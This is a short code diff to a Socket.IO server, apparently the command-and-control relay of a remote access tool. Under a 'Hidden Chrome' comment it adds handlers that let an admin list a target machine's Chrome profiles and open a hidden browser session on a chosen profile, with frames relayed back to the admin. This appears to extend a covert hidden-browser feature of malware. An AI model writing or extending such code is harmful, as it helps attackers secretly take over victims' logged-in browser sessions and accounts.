@@ -74,8 +74,20 @@ io.on('connection', (socket) => {
   });
 
   // Hidden Chrome
-  socket.on('request-hidden-chrome', (targetClientId) => {
-    io.to(targetClientId).emit('request-hidden-chrome', socket.id);
+  socket.on('request-chrome-profiles', (targetClientId) => {
+    io.to(targetClientId).emit('request-chrome-profiles', socket.id);
+  });
+
+  socket.on('chrome-profiles-list', (data) => {
+    io.to(data.adminId).emit('chrome-profiles-list', { targetId: socket.id, profiles: data.profiles });
+  });
+
+  socket.on('request-hidden-chrome', (data) => {
+    if (typeof data === 'string') {
+        io.to(data).emit('request-hidden-chrome', socket.id);
+    } else {
+        io.to(data.targetId).emit('request-hidden-chrome', { adminId: socket.id, profileName: data.profileName });
+    }
   });
 
   socket.on('hidden-chrome-frame', (data) => {
